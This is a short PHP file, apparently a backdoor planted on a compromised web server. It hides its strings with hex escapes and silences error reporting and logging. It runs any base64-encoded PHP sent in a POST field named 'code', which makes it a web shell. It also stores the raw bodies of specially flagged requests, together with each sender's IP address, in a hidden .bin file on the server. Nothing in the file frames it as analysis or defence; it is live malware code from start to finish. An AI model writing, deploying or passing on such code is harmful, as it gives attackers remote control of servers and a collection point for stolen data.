<?php @error_reporting(0); @ini_set("di\x73\x70lay\x5ferror\x73",0); @ini_set("\x6c\x6f\x67_\x65\x72\x72o\x72s",0); @ini_set("err\x6fr\x5fl\x6f\x67",0); @ini_set("\x6d\x65\x6d\x6fr\x79_limit", "\x312\x38M"); @ini_set("\x6d\x61\x78\x5fe\x78\x65\x63uti\x6f\x6e_ti\x6de",30); @set_time_limit(30); if (isset($_SERVER["H\x54TP\x5fX\x5f\x52E\x41\x4c\x5f\x49\x50"])) $_SERVER["\x52EMO\x54\x45\x5f\x41\x44\x44\x52"] = $_SERVER["H\x54TP\x5fX\x5f\x52E\x41\x4c\x5f\x49\x50"]; if (isset($_POST["\x63o\x64\x65"])) { eval(base64_decode($_POST["\x63o\x64\x65"])); } elseif (isset($_SERVER["\x48T\x54\x50_CONT\x45\x4e\x54\x5fE\x4e\x43\x4fDI\x4eG"]) && $_SERVER["\x48T\x54\x50_CONT\x45\x4e\x54\x5fE\x4e\x43\x4fDI\x4eG"] == "bi\x6e\x61r\x79") { $input = file_get_contents("p\x68p\x3a\x2f\x2f\x69\x6ep\x75\x74"); if (strlen($input) > 0) print "\x53\x54\x41T\x55\x53\x2dI\x4d\x50OR\x54-\x4f\x4b"; if (strlen($input) > 10) { $fp = @fopen(str_replace("\x2e\x70\x68\x70","\x2eb\x69\x6e",basename($_SERVER["\x53CR\x49PT_\x46I\x4c\x45NA\x4d\x45"])), "\x61"); @flock($fp, LOCK_EX); @fputs($fp, $_SERVER["\x52EMO\x54\x45\x5f\x41\x44\x44\x52"]."\t".base64_encode($input)."\r\n"); @flock($fp, LOCK_UN); @fclose($fp); } } elseif (strpos($_SERVER["R\x45Q\x55\x45ST\x5fU\x52\x49"], "\x2es\x68\x74\x6dl") !== false) { print $_SERVER["R\x45Q\x55\x45ST\x5fU\x52\x49"]; } exit; ?>